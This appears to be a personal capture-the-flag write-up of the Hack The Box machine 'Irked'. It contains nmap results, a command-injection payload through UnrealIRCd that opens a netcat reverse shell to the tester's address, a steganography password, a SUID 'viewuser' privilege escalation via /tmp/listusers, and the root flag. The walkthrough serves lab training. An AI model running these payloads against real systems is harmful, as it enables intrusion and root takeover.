nmap
```
┌──(kali㉿kali)-[~/HTB/irked]
└─$ sudo nmap -T5 -p- -A -oN nmap 10.129.203.210                            
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-14 23:37 EST
Warning: 10.129.203.210 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.203.210
Host is up (0.046s latency).
Not shown: 65084 closed tcp ports (reset), 444 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          33049/udp   status
|   100024  1          42527/udp6  status
|   100024  1          47856/tcp6  status
|_  100024  1          50074/tcp   status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
50074/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
Network Distance: 2 hops
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   43.76 ms 10.10.14.1
2   44.02 ms 10.129.203.210

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.29 seconds
```

![Pasted image 20250115123738](<0. Attachments/Pasted image 20250115123738.png>)

using the IRC we ping back to our tun0 to check if the command works
![Pasted image 20250115124552](<0. Attachments/Pasted image 20250115124552.png>)

lets try getting a rev shell
```
AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.4 443 >/tmp/f
```
![Pasted image 20250115124731](<0. Attachments/Pasted image 20250115124731.png>)
![Pasted image 20250115124746](<0. Attachments/Pasted image 20250115124746.png>)

steg - but what is it
![Pasted image 20250115125204](<0. Attachments/Pasted image 20250115125204.png>)
```
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

![Pasted image 20250115125333](<0. Attachments/Pasted image 20250115125333.png>)

so we use it on the image on website
![Pasted image 20250115125605](<0. Attachments/Pasted image 20250115125605.png>)

we can try to ssh
![Pasted image 20250115125910](<0. Attachments/Pasted image 20250115125910.png>)

priv esc
```
djmardov@irked:~$ echo "test" > /tmp/listusers
djmardov@irked:~$ chmod +x /tmp/listusers
djmardov@irked:~$ echo id > /tmp/listusers 
djmardov@irked:~$ viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2025-01-14 23:36 (:0)
djmardov pts/0        2025-01-14 23:58 (10.10.14.4)
uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
djmardov@irked:~$ echo sh > /tmp/listusers
djmardov@irked:~$ viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2025-01-14 23:36 (:0)
djmardov pts/0        2025-01-14 23:58 (10.10.14.4)
# whoami && id
root
uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
# cat /root/root.txt
14ebe051531beb8c13e0df0ef1ed4d33
```

![Pasted image 20250115130646](<0. Attachments/Pasted image 20250115130646.png>)

